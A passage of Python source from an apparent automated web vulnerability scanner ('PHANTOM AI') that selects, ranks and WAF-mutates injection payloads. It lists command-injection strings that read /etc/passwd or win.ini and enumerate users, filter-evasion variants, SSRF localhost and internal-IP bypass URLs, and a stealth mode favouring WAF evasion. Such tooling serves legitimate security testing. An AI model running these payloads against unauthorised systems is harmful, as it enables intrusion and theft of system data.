            ("http://127.0.0.1.nip.io", "DNS rebinding"),
            ("http://localtest.me", "localtest.me"),
            ("http://127.0.0.1.xip.io", "xip.io bypass"),
        ]
        payloads.extend(localhost_bypasses)

        # Internal IP scanning
        if internal_ips:
            for ip in internal_ips[:MAX_INTERNAL_IPS_TO_TEST]:  # M1 FIX
                payloads.append((f"http://{ip}", f"Internal IP {ip}"))

        return payloads

    def generate_cmdi_for_os(
        self,
        os_type: str = "unix"
    ) -> List[Tuple[str, str]]:
        """Generate command injection payloads for specific OS."""
        payloads = []

        os_payloads = {
            "unix": [
                ("; id", "Semicolon chain (id)"),
                ("| id", "Pipe (id)"),
                ("|| id", "OR operator (id)"),
                ("&& id", "AND operator (id)"),
                ("& id", "Background (id)"),
                ("`id`", "Backtick substitution"),
                ("$(id)", "Dollar substitution"),
                ("; cat /etc/passwd", "Read passwd"),
                ("; ls -la", "List directory"),
                ("; whoami", "Current user"),
                ("; uname -a", "System info"),
                # Blind detection
                ("; sleep 5", "Blind sleep"),
                ("| sleep 5", "Blind sleep pipe"),
                ("; ping -c 5 127.0.0.1", "Blind ping"),
                # Space bypass
                (";{id}", "Brace bypass"),
                (";$IFS$9id", "IFS bypass"),
                (";cat${IFS}/etc/passwd", "IFS cat"),
                (";id$u", "Variable bypass"),
            ],
            "windows": [
                ("& whoami", "Ampersand whoami"),
                ("| whoami", "Pipe whoami"),
                ("|| whoami", "OR whoami"),
                ("&& whoami", "AND whoami"),
                ("& dir", "List directory"),
                ("& type %SYSTEMROOT%\\win.ini", "Read win.ini"),
                ("& net user", "List users"),
                ("& ipconfig", "Network config"),
                # Blind detection
                ("& ping -n 5 127.0.0.1", "Blind ping"),
                ("& timeout 5", "Blind timeout"),
            ],
        }

        os_lower = os_type.lower()
        if os_lower in os_payloads:
            payloads.extend(os_payloads[os_lower])

        return payloads


# =============================================================================
# MAIN CONTEXT PAYLOAD SELECTOR
# =============================================================================

class ContextPayloadSelector:
    """
    Enterprise Context-Aware Payload Selector.

    Selects, ranks, and generates payloads based on comprehensive
    contextual analysis of the target environment.

    Features:
    - Technology-aware payload selection
    - WAF-aware payload mutation
    - Parameter context analysis
    - Effectiveness-based ranking
    - Deduplication and optimization
    - Adaptive learning from results
    """

    VERSION = "3.0.0"

    def __init__(self):
        """Initialize the Context Payload Selector."""
        # Core components
        self.payload_library = PayloadLibrary.get_instance()
        self.waf_engine = WAFBypassEngine()
        self.tech_mapper = TechPayloadMapper()
        self.generator = ContextualPayloadGenerator()

        # Effectiveness tracking (learning from results)
        self._effectiveness_cache: Dict[str, Dict[str, float]] = defaultdict(dict)

        # Locks for thread safety
        self._lock = asyncio.Lock()

        # H2 FIX 2026-02-13: Initialize metrics tracking
        self._init_metrics()

        logger.info(f"ContextPayloadSelector v{self.VERSION} initialized")

    def _init_metrics(self) -> None:
        """Initialize metrics tracking. H2 FIX 2026-02-13."""
        self._metrics = {
            "selections_attempted": 0,
            "payloads_selected": 0,
            "payloads_generated": 0,
            "payloads_mutated": 0,
            "waf_mutations_applied": 0,
            "cache_hits": 0,
            "cache_size": 0,
            "by_category": defaultdict(int),
            "by_strategy": defaultdict(int),
        }

    def get_metrics(self) -> dict:
        """Return current metrics. H2 FIX 2026-02-13."""
        metrics = dict(self._metrics)
        metrics["by_category"] = dict(metrics["by_category"])
        metrics["by_strategy"] = dict(metrics["by_strategy"])
        metrics["cache_size"] = sum(len(v) for v in self._effectiveness_cache.values())
        return metrics

    def reset_metrics(self) -> None:
        """Reset metrics to initial state. H2 FIX 2026-02-13."""
        self._init_metrics()

    def _prune_cache_if_needed(self) -> None:
        """Prune effectiveness cache if it exceeds limit. H4 FIX 2026-02-13."""
        total_entries = sum(len(v) for v in self._effectiveness_cache.values())
        if total_entries > MAX_CACHE_ENTRIES:
            # Remove lowest-scored entries until under limit
            all_entries = []
            for cache_key, payloads in self._effectiveness_cache.items():
                for payload, score in payloads.items():
                    all_entries.append((cache_key, payload, score))

            # Sort by score (ascending) and remove bottom 20%
            all_entries.sort(key=lambda x: x[2])
            entries_to_remove = int(len(all_entries) * 0.2)

            for cache_key, payload, _ in all_entries[:entries_to_remove]:
                if cache_key in self._effectiveness_cache:
                    self._effectiveness_cache[cache_key].pop(payload, None)

            logger.debug(f"[CACHE] Pruned {entries_to_remove} entries from effectiveness cache")

    async def select_payloads(
        self,
        context: PayloadContext
    ) -> SelectionResult:
        """
        Select and rank payloads based on the provided context.

        Args:
            context: Complete context for payload selection

        Returns:
            SelectionResult with ranked payloads
        """
        # H3 FIX 2026-02-13: import time moved to module level
        start_time = time.time()

        async with self._lock:
            # Step 1: Determine relevant categories
            relevant_categories = self._determine_relevant_categories(context)

            # Step 2: Get base payloads from library
            base_payloads = self._get_base_payloads(
                relevant_categories, context
            )

            # Step 3: Generate context-specific payloads
            generated_payloads = self._generate_contextual_payloads(context)

            # Step 4: Combine all payloads
            all_payloads = base_payloads + generated_payloads

            # Step 5: Apply WAF bypass mutations if needed
            if context.waf_detection and context.waf_detection.waf_detected:
                all_payloads = self._apply_waf_mutations(
                    all_payloads, context
                )

            # Step 6: Rank payloads by effectiveness
            ranked_payloads = self._rank_payloads(all_payloads, context)

            # Step 7: Deduplicate
            unique_payloads = self._deduplicate_payloads(ranked_payloads)

            # Step 8: Apply strategy limits
            final_payloads = self._apply_strategy_limits(
                unique_payloads, context
            )

            # Calculate statistics
            categories_covered = set(p.category for p in final_payloads)
            category_distribution = {}
            for cat in categories_covered:
                category_distribution[cat.name] = sum(
                    1 for p in final_payloads if p.category == cat
                )

            elapsed_ms = (time.time() - start_time) * 1000

            result = SelectionResult(
                payloads=final_payloads,
                total_considered=len(all_payloads),
                total_selected=len(final_payloads),
                categories_covered=categories_covered,
                context=context,
                selection_time_ms=elapsed_ms,
                recommended_order=[p.payload_hash for p in final_payloads],
                category_distribution=category_distribution,
            )

            logger.info(
                f"Selected {len(final_payloads)}/{len(all_payloads)} payloads "
                f"in {elapsed_ms:.2f}ms covering {len(categories_covered)} categories"
            )

            return result

    def _determine_relevant_categories(
        self,
        context: PayloadContext
    ) -> List[Tuple[PayloadCategory, float]]:
        """
        Determine which payload categories are relevant for this context.

        Returns list of (category, priority_score) tuples.
        """
        category_scores: Dict[PayloadCategory, float] = defaultdict(float)

        # 1. Score based on vulnerability contexts from parameter analysis
        for vuln_context in context.vulnerability_contexts:
            category = self.tech_mapper.vuln_context_to_category(vuln_context)
            if category:
                category_scores[category] += 1.0

        # 2. Score based on detected technologies
        all_techs = (
            context.detected_technologies +
            context.detected_frameworks +
            context.detected_databases
        )

        for tech in all_techs:
            for category in PayloadCategory:
                affinity = self.tech_mapper.get_tech_affinity(tech, category)
                if affinity > 0:
                    category_scores[category] += affinity

        # 3. Score based on parameter type
        if context.inferred_type:
            for category in PayloadCategory:
                affinity = self.tech_mapper.get_param_type_affinity(
                    context.inferred_type, category
                )
                if affinity > 0:
                    category_scores[category] += affinity * 0.5

        # 4. Score based on reflection
        if context.has_reflection:
            category_scores[PayloadCategory.XSS] += 0.8
            category_scores[PayloadCategory.SSTI] += 0.5

        # 5. Boost injection potential
        for category in category_scores:
            category_scores[category] *= (0.5 + context.injection_potential * 0.5)

        # 6. Always include some baseline categories with lower scores
        baseline_categories = [
            PayloadCategory.SQLI,
            PayloadCategory.XSS,
            PayloadCategory.CMDI,
        ]
        for cat in baseline_categories:
            if category_scores[cat] == 0:
                category_scores[cat] = 0.2

        # Sort by score
        sorted_categories = sorted(
            category_scores.items(),
            key=lambda x: x[1],
            reverse=True
        )

        # Filter out zero-score categories
        relevant = [(cat, score) for cat, score in sorted_categories if score > 0]

        logger.debug(f"Relevant categories: {[(c.name, round(s, 2)) for c, s in relevant[:5]]}")

        return relevant

    def _get_base_payloads(
        self,
        relevant_categories: List[Tuple[PayloadCategory, float]],
        context: PayloadContext
    ) -> List[RankedPayload]:
        """Get base payloads from the library for relevant categories."""
        payloads = []

        for category, priority_score in relevant_categories:
            # Determine filters
            db_type = None
            xss_context = None

            if category == PayloadCategory.SQLI and context.detected_databases:
                db_type = context.detected_databases[0].lower()

            if category == PayloadCategory.XSS and context.reflection_context:
                xss_context = context.reflection_context

            # Get payloads from library
            library_payloads = self.payload_library.get_payload_objects(
                category,
                db_type=db_type,
                context=xss_context,
            )

            # Convert to RankedPayload
            for p in library_payloads:
                ranked = RankedPayload(
                    payload=p.raw,
                    original_payload=p.raw,
                    category=category,
                    effectiveness_score=0.0,  # Will be calculated later
                    priority=self._severity_to_priority(p.severity),
                    tech_affinity=priority_score,
                    waf_bypass_score=0.5,  # Default
                    context_score=0.5,  # Default
                    description=p.description,
                    tags=p.tags,
                    success_indicators=p.success_indicators,
                    source="library",
                )
                payloads.append(ranked)

        return payloads

    def _generate_contextual_payloads(
        self,
        context: PayloadContext
    ) -> List[RankedPayload]:
        """Generate context-specific payloads."""
        payloads = []

        # Generate database-specific SQLi payloads
        if context.detected_databases:
            for db in context.detected_databases[:MAX_DB_SPECIFIC_PAYLOADS]:  # M1 FIX
                # M2 FIX 2026-02-13: Error handling for generator
                try:
                    db_payloads = self.generator.generate_sqli_for_db(
                        db,
                        with_waf_bypass=False,  # We'll apply bypass later
                        waf_detection=context.waf_detection,
                    )
                except Exception as e:
                    logger.warning(f"Failed to generate SQLi payloads for {db}: {e}")
                    db_payloads = []
                for payload, desc in db_payloads:
                    ranked = RankedPayload(
                        payload=payload,
                        original_payload=payload,
                        category=PayloadCategory.SQLI,
                        effectiveness_score=0.0,
                        priority=PayloadPriority.HIGH,
                        tech_affinity=0.9,  # High affinity for db-specific
                        waf_bypass_score=0.5,
                        context_score=0.8,
                        description=desc,
                        tags={"generated", "db-specific", db.lower()},
                        source="generated",
                    )
                    payloads.append(ranked)

        # Generate template-specific SSTI payloads
        template_engines = []
        for tech in context.detected_technologies + context.detected_frameworks:
            tech_lower = tech.lower()
            # L2 FIX 2026-02-13: Use extensible constant
            if any(engine in tech_lower for engine in TEMPLATE_ENGINES):
                template_engines.append(tech_lower)

        # Also check if Flask is detected (implies Jinja2)
        if any("flask" in t.lower() for t in context.detected_frameworks):
            if "jinja2" not in template_engines and "jinja" not in template_engines:
                template_engines.append("jinja2")

        for engine in template_engines[:MAX_ENGINE_SPECIFIC_PAYLOADS]:  # M1 FIX
            # M2 FIX 2026-02-13: Error handling for generator
            try:
                ssti_payloads = self.generator.generate_ssti_for_engine(
                    engine,
                    with_waf_bypass=False,
                    waf_detection=context.waf_detection,
                )
            except Exception as e:
                logger.warning(f"Failed to generate SSTI payloads for {engine}: {e}")
                ssti_payloads = []
            for payload, desc in ssti_payloads:
                ranked = RankedPayload(
                    payload=payload,
                    original_payload=payload,
                    category=PayloadCategory.SSTI,
                    effectiveness_score=0.0,
                    priority=PayloadPriority.CRITICAL,
                    tech_affinity=1.0,  # Perfect affinity for engine-specific
                    waf_bypass_score=0.5,
                    context_score=0.9,
                    description=desc,
                    tags={"generated", "engine-specific", engine},
                    source="generated",
                )
                payloads.append(ranked)

        # Generate XSS payloads based on reflection context
        if context.has_reflection and context.reflection_context:
            # M2 FIX 2026-02-13: Error handling for generator
            try:
                xss_payloads = self.generator.generate_xss_for_context(
                    context.reflection_context,
                    with_waf_bypass=False,
                    waf_detection=context.waf_detection,
                )
            except Exception as e:
                logger.warning(f"Failed to generate XSS payloads for {context.reflection_context}: {e}")
                xss_payloads = []
            for payload, desc in xss_payloads:
                ranked = RankedPayload(
                    payload=payload,
                    original_payload=payload,
                    category=PayloadCategory.XSS,
                    effectiveness_score=0.0,
                    priority=PayloadPriority.HIGH,
                    tech_affinity=0.8,
                    waf_bypass_score=0.5,
                    context_score=0.9,  # High for context-specific
                    description=desc,
                    tags={"generated", "context-specific", context.reflection_context},
                    source="generated",
                )
                payloads.append(ranked)

        # Generate SSRF payloads if URL parameter detected
        if context.inferred_type == InferredType.URL:
            # Check for cloud indicators
            cloud_provider = None
            for tech in context.detected_technologies:
                tech_lower = tech.lower()
                if "aws" in tech_lower or "amazon" in tech_lower:
                    cloud_provider = "aws"
                    break
                elif "gcp" in tech_lower or "google" in tech_lower:
                    cloud_provider = "gcp"
                    break
                elif "azure" in tech_lower or "microsoft" in tech_lower:
                    cloud_provider = "azure"
                    break

            # M2 FIX 2026-02-13: Error handling for generator
            try:
                ssrf_payloads = self.generator.generate_ssrf_for_cloud(
                    cloud_provider=cloud_provider
                )
            except Exception as e:
                logger.warning(f"Failed to generate SSRF payloads for {cloud_provider}: {e}")
                ssrf_payloads = []
            for payload, desc in ssrf_payloads:
                ranked = RankedPayload(
                    payload=payload,
                    original_payload=payload,
                    category=PayloadCategory.SSRF,
                    effectiveness_score=0.0,
                    priority=PayloadPriority.CRITICAL if cloud_provider else PayloadPriority.HIGH,
                    tech_affinity=0.9 if cloud_provider else 0.7,
                    waf_bypass_score=0.5,
                    context_score=0.95,  # Very high for URL params
                    description=desc,
                    tags={"generated", "ssrf", cloud_provider or "generic"},
                    source="generated",
                )
                payloads.append(ranked)

        return payloads

    def _apply_waf_mutations(
        self,
        payloads: List[RankedPayload],
        context: PayloadContext
    ) -> List[RankedPayload]:
        """Apply WAF bypass mutations to payloads."""
        mutated_payloads = []

        waf_detection = context.waf_detection
        if not waf_detection or not waf_detection.waf_detected:
            return payloads

        for ranked in payloads:
            # Keep original
            mutated_payloads.append(ranked)

            # Generate bypass variants (M1 FIX: use constant)
            bypass_variants = self.waf_engine.generate_bypass_variants(
                ranked.payload,
                waf_detection,
                max_variants=MAX_WAF_VARIANTS_PER_PAYLOAD,
            )

            for bypassed_payload, techniques in bypass_variants:
                if bypassed_payload != ranked.payload:
                    mutated = RankedPayload(
                        payload=bypassed_payload,
                        original_payload=ranked.original_payload,
                        category=ranked.category,
                        effectiveness_score=0.0,
                        priority=ranked.priority,
                        tech_affinity=ranked.tech_affinity,
                        waf_bypass_score=0.8,  # Higher for mutated
                        context_score=ranked.context_score,
                        description=f"{ranked.description} (WAF bypass)",
                        tags=ranked.tags | {"waf-bypass"},
                        bypass_techniques=techniques,
                        success_indicators=ranked.success_indicators,
                        source="mutated",
                    )
                    mutated_payloads.append(mutated)

        return mutated_payloads

    def _rank_payloads(
        self,
        payloads: List[RankedPayload],
        context: PayloadContext
    ) -> List[RankedPayload]:
        """Rank payloads by effectiveness score."""
        for payload in payloads:
            # Calculate composite effectiveness score
            # Weights: tech_affinity (30%), waf_bypass (30%), context (30%), priority (10%)
            tech_weight = 0.30
            waf_weight = 0.30
            context_weight = 0.30
            priority_weight = 0.10

            effectiveness = (
                payload.tech_affinity * tech_weight +
                payload.waf_bypass_score * waf_weight +
                payload.context_score * context_weight +
                payload.priority.value * priority_weight
            )

            # Boost for generated/context-specific payloads
            if payload.source == "generated":
                effectiveness *= 1.1

            # Boost for payloads with success indicators
            if payload.success_indicators:
                effectiveness *= 1.05

            # Apply historical effectiveness if available
            cache_key = f"{context.target_url}:{payload.category.name}"
            if cache_key in self._effectiveness_cache:
                history = self._effectiveness_cache[cache_key]
                if payload.original_payload in history:
                    historical = history[payload.original_payload]
                    effectiveness = effectiveness * 0.7 + historical * 0.3

            # Cap at 1.0
            payload.effectiveness_score = min(effectiveness, 1.0)

        # Sort by effectiveness (descending)
        payloads.sort(key=lambda p: p.effectiveness_score, reverse=True)

        return payloads

    def _deduplicate_payloads(
        self,
        payloads: List[RankedPayload]
    ) -> List[RankedPayload]:
        """Remove duplicate payloads, keeping highest-ranked."""
        seen_hashes: Set[str] = set()
        unique: List[RankedPayload] = []

        for payload in payloads:
            if payload.payload_hash not in seen_hashes:
                seen_hashes.add(payload.payload_hash)
                unique.append(payload)

        return unique

    def _apply_strategy_limits(
        self,
        payloads: List[RankedPayload],
        context: PayloadContext
    ) -> List[RankedPayload]:
        """Apply selection strategy limits."""
        strategy = context.strategy
        max_payloads = context.max_payloads

        # Strategy-specific limits
        strategy_limits = {
            SelectionStrategy.AGGRESSIVE: 100,
            SelectionStrategy.BALANCED: 50,
            SelectionStrategy.STEALTH: 20,
            SelectionStrategy.TARGETED: 30,
            SelectionStrategy.EXHAUSTIVE: 200,
        }

        limit = min(strategy_limits.get(strategy, 50), max_payloads)

        # For stealth mode, prefer WAF bypass payloads
        if strategy == SelectionStrategy.STEALTH:
            payloads.sort(
                key=lambda p: (p.waf_bypass_score, p.effectiveness_score),
                reverse=True
            )

        # For targeted mode, focus on highest effectiveness
        elif strategy == SelectionStrategy.TARGETED:
            pass  # Already sorted by effectiveness

        return payloads[:limit]

    def _severity_to_priority(self, severity: str) -> PayloadPriority:
        """Convert severity string to PayloadPriority enum."""
        mapping = {
            "critical": PayloadPriority.CRITICAL,
            "high": PayloadPriority.HIGH,
            "medium": PayloadPriority.MEDIUM,
            "low": PayloadPriority.LOW,
        }
        return mapping.get(severity.lower(), PayloadPriority.MEDIUM)

    async def record_result(
        self,
        target_url: str,
        category: PayloadCategory,
        payload: str,
        success: bool
    ) -> None:
        """
        Record payload result for adaptive learning.

        Args:
            target_url: Target URL
            category: Payload category
            payload: The payload that was tested
            success: Whether it was successful

        Note: This method is async for thread safety with the shared cache.
        """
        # C1 FIX 2026-02-13: Thread-safe cache mutation
        async with self._lock:
            cache_key = f"{target_url}:{category.name}"

            # Update effectiveness based on result
            current = self._effectiveness_cache[cache_key].get(payload, 0.5)
            if success:
                new_score = min(current * 1.5, 1.0)  # Boost successful payloads
            else:
                new_score = current * 0.8  # Reduce unsuccessful payloads

            self._effectiveness_cache[cache_key][payload] = new_score

            # Prune cache if too large (H4 FIX)
            self._prune_cache_if_needed()

        logger.debug(
            f"Recorded result for {category.name}: "
            f"{'success' if success else 'failure'} "
            f"({current:.2f} -> {new_score:.2f})"
        )

    def get_quick_payloads(
        self,
        category: PayloadCategory,
        max_payloads: int = 10,
        with_waf_bypass: bool = True,
        waf_detection: Optional[WAFDetectionResult] = None
    ) -> List[str]:
        """
        Quick method to get payloads for a category without full context.

        Args:
            category: Payload category to get
            max_payloads: Maximum number of payloads
            with_waf_bypass: Include WAF bypass variants
            waf_detection: Optional WAF detection result

        Returns:
            List of payload strings
        """
        payloads = self.payload_library.get_payloads(
            category,
            max_payloads=max_payloads,
            with_waf_bypass=with_waf_bypass,
        )

        if waf_detection and waf_detection.waf_detected:
            bypassed = []
            for payload in payloads:
                bypassed_payload = self.waf_engine.apply_bypass(
                    payload, waf_detection, max_mutations=1
                )
                bypassed.append(bypassed_payload)
            return bypassed

        return payloads

    def get_statistics(self) -> Dict[str, Any]:
        """Get selector statistics."""
        waf_stats = self.waf_engine.get_statistics()
        return {
            "version": self.VERSION,
            "payload_library_categories": len(PayloadCategory),
            "waf_signatures": waf_stats.get("total_signatures", 0),
            "bypass_strategies": waf_stats.get("bypass_strategies", 0),
            "effectiveness_cache_entries": sum(
                len(v) for v in self._effectiveness_cache.values()
            ),
            "tech_mappings": len(TechPayloadMapper.TECH_CATEGORY_AFFINITY),
            "param_type_mappings": len(TechPayloadMapper.PARAM_TYPE_AFFINITIES),
        }


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

async def select_payloads_for_parameter(
    target_url: str,
    endpoint: str,
    parameter_name: str,
    fingerprint: Optional[FingerprintResult] = None,
    waf_detection: Optional[WAFDetectionResult] = None,
    parameter_analysis: Optional[AnalyzedParameter] = None,
    strategy: SelectionStrategy = SelectionStrategy.BALANCED,
    max_payloads: int = 50,
) -> SelectionResult:
    """
    Convenience function to select payloads for a parameter.

    Args:
        target_url: Target URL
        endpoint: Endpoint path
        parameter_name: Parameter name
        fingerprint: Optional fingerprint result
        waf_detection: Optional WAF detection result
        parameter_analysis: Optional parameter analysis
        strategy: Selection strategy
        max_payloads: Maximum payloads to return

    Returns:
        SelectionResult with ranked payloads
    """
    # Build context
    context = PayloadContext(
        target_url=target_url,
        endpoint=endpoint,
        parameter_name=parameter_name,
        fingerprint=fingerprint,
        waf_detection=waf_detection,
        strategy=strategy,
        max_payloads=max_payloads,
    )

    # Extract technologies from fingerprint
    if fingerprint:
        for tech in fingerprint.detected_technologies:
            if tech.category in [TechCategory.WEB_FRAMEWORK, TechCategory.CMS]:
                context.detected_frameworks.append(tech.name)
            elif tech.category == TechCategory.DATABASE:
                context.detected_databases.append(tech.name)
            else:
                context.detected_technologies.append(tech.name)

    # C2 FIX 2026-02-13: Create selector once and reuse
    selector = ContextPayloadSelector()

    # Extract from WAF detection
    if waf_detection:
        context.waf_behaviour = waf_detection.behaviour_family
        # Get bypass strategies using the same selector instance
        context.bypass_strategies = selector.waf_engine.get_bypass_strategies(
            waf_detection
        )

    # Extract from parameter analysis
    if parameter_analysis:
        context.parameter_analysis = parameter_analysis
        context.inferred_type = parameter_analysis.inferred_type
        context.vulnerability_contexts = parameter_analysis.vulnerability_contexts
        context.injection_potential = parameter_analysis.injection_potential
        context.has_reflection = parameter_analysis.has_reflection
        if parameter_analysis.reflection_contexts:
            context.reflection_context = parameter_analysis.reflection_contexts[0]

    # Select payloads using the same selector instance
    return await selector.select_payloads(context)


# =============================================================================
# MODULE TEST
# =============================================================================

if __name__ == "__main__":
    import asyncio

    async def test_selector():
        """Test the Context Payload Selector."""
        print("=" * 60)
        print("PHANTOM AI - Context Payload Selector Test")
        print("=" * 60)

        selector = ContextPayloadSelector()

        # Print statistics
        stats = selector.get_statistics()
        print(f"\n✅ ContextPayloadSelector v{selector.VERSION} created")
        print("\n📊 Statistics:")
        for key, value in stats.items():
            print(f"   {key}: {value}")

        # Test quick payloads
        print("\n🔍 Quick Payload Test (SQLi, 5 payloads):")
        sqli_payloads = selector.get_quick_payloads(
            PayloadCategory.SQLI,
            max_payloads=5
        )
        for i, p in enumerate(sqli_payloads, 1):
            print(f"   {i}. {p[:60]}...")

        # Test with context
        print("\n🎯 Context-Based Selection Test:")
        context = PayloadContext(
            target_url="https://example.com",
            endpoint="/api/search",
            parameter_name="q",
            detected_frameworks=["Flask"],
            detected_databases=["MySQL"],
            vulnerability_contexts=[
                VulnerabilityContext.SQL_INJECTION,
                VulnerabilityContext.XSS,
            ],
            inferred_type=InferredType.STRING,
            injection_potential=0.8,
            has_reflection=True,
            reflection_context="html_tag",
            strategy=SelectionStrategy.BALANCED,
            max_payloads=20,
        )

        result = await selector.select_payloads(context)

        print(f"\n   Total considered: {result.total_considered}")
        print(f"   Total selected: {result.total_selected}")
        print(f"   Selection time: {result.selection_time_ms:.2f}ms")
        print(f"   Categories covered: {[c.name for c in result.categories_covered]}")
        print(f"\n   Category distribution:")
        for cat, count in result.category_distribution.items():
            print(f"      {cat}: {count}")

        print(f"\n   Top 5 ranked payloads:")
        for i, p in enumerate(result.payloads[:5], 1):
            print(f"      {i}. [{p.category.name}] {p.payload[:50]}...")
            print(f"         Score: {p.effectiveness_score:.3f} | Source: {p.source}")

        print("\n" + "=" * 60)
        print("✅ Context Payload Selector test complete!")
        print("=" * 60)

    asyncio.run(test_selector())
